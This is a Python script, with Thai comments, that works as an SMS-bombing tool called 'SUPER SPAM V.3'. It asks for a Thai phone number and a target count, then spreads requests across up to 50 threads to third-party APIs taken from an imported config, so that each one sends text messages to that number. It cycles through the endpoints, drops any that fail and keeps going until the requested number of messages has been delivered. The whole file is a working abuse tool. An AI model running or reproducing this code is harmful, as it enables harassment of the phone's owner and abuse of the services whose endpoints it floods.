# program/SMS-SUPER.py
import requests
import threading
import time
import sys
import random
from API_LIST import API_CONFIG # ดึง Config จากไฟล์กลาง

# ==========================================
# ตั้งค่าความแรง
# ==========================================
MAX_THREADS = 50   # จำนวน Thread สูงสุด
TIMEOUT_SEC = 5    # รอ 5 วิ
lock = threading.Lock()

# ตัวแปร Global
success_total = 0
banned_apis = set() # เก็บรายชื่อ API ที่ตายแล้ว

# ==========================================
# ฟังก์ชันจัดการเบอร์
# ==========================================
def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

# ==========================================
# ฟังก์ชันยิง (Worker)
# ==========================================
def shoot_api(phone, api_key):
    global success_total
    
    # เช็คก่อนยิงว่าโดนแบนหรือยัง
    if api_key in banned_apis:
        return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        # เตรียม Data
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict):
            kwargs["json"] = data_input
        elif isinstance(data_input, str):
            kwargs["data"] = data_input

        # เริ่มยิง Request
        response = requests.request(cfg["method"], url, **kwargs)
        
        # ตรวจสอบความสำเร็จ
        is_success = False
        if response.status_code in (200, 201):
            if cfg["success_check"](response.text):
                is_success = True
            # Fallback: ถ้า Status OK และข้อความไม่ยาวเกินไป (เผื่อเว็บ Error หน้าขาว)
            elif len(response.text) < 500 and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                print(f"✅ ส่งสำเร็จครั้งที่ {success_total} | API: {cfg['name']}")
        else:
            # ยิงไม่เข้า แต่ Server ตอบกลับ (เช่น ติด Cooldown หรือ 404)
            if response.status_code >= 400:
                with lock:
                    if api_key not in banned_apis:
                        print(f"💀 API {cfg['name']} ตาย (Status {response.status_code}) -> ตัดทิ้ง!")
                        banned_apis.add(api_key)

    except Exception:
        # Timeout หรือ Error connection
        with lock:
            if api_key not in banned_apis:
                # print(f"💀 API {cfg['name']} ไม่ตอบสนอง -> ตัดทิ้ง!") 
                banned_apis.add(api_key)

# ==========================================
# ฟังก์ชันหลัก (Loop จนกว่าจะครบ)
# ==========================================
def start_super_spam(phone, target_amount):
    print(f"\n🚀 SUPER SPAM V.3 (Guaranteed Success) ไปที่: {phone}")
    print(f"🎯 เป้าหมายความสำเร็จ: {target_amount} ครั้ง")
    print("-" * 50)

    # รายชื่อ API ทั้งหมด
    all_api_keys = list(API_CONFIG.keys())
    
    threads = []
    attempt_count = 0 # นับจำนวนรอบที่พยายามยิง
    
    # Loop: ทำงานไปเรื่อยๆ จนกว่า success_total จะเท่ากับ target_amount
    while success_total < target_amount:
        
        # กรองเอาเฉพาะ API ที่ยังดีอยู่
        active_apis = [k for k in all_api_keys if k not in banned_apis]
        
        if not active_apis:
            print("\n❌ ไม่มี API ที่ใช้งานได้เหลืออยู่เลย! ระบบจำเป็นต้องหยุด")
            break

        # เลือก API (Round Robin)
        api_key = active_apis[attempt_count % len(active_apis)]
        
        # สร้าง Thread ยิง
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        # จัดการ Thread: ลบตัวที่ทำงานเสร็จแล้วออกจาก list
        threads = [t for t in threads if t.is_alive()]

        # ถ้า Thread เต็ม ให้รอหน่อย
        while len(threads) >= MAX_THREADS:
            time.sleep(0.1)
            threads = [t for t in threads if t.is_alive()]
        
        # Delay เล็กน้อยระหว่าง loop เพื่อความเสถียร
        time.sleep(0.02)

    # รอเก็บตก Thread ที่ค้างอยู่ให้จบ
    for t in threads:
        t.join()

    print("-" * 50)
    print(f"🏁 ภารกิจเสร็จสิ้นสมบูรณ์!")
    print(f"✅ ยอดสำเร็จ: {success_total}/{target_amount}")
    print(f"🔁 จำนวนครั้งที่พยายามยิงทั้งหมด: {attempt_count}")
    print(f"💀 API ที่ถูกตัดทิ้ง: {len(banned_apis)}")
    print("-" * 50)

if __name__ == "__main__":
    try:
        phone_input = input("📞 เบอร์โทรศัพท์: ")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print("❌ เบอร์ไม่ถูกต้อง")
            sys.exit()

        amount_input = input("🔢 จำนวนความสำเร็จที่ต้องการ: ")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print("❌ ใส่ตัวเลขเท่านั้น")
    except KeyboardInterrupt:
        print("\n⛔ ยกเลิก")
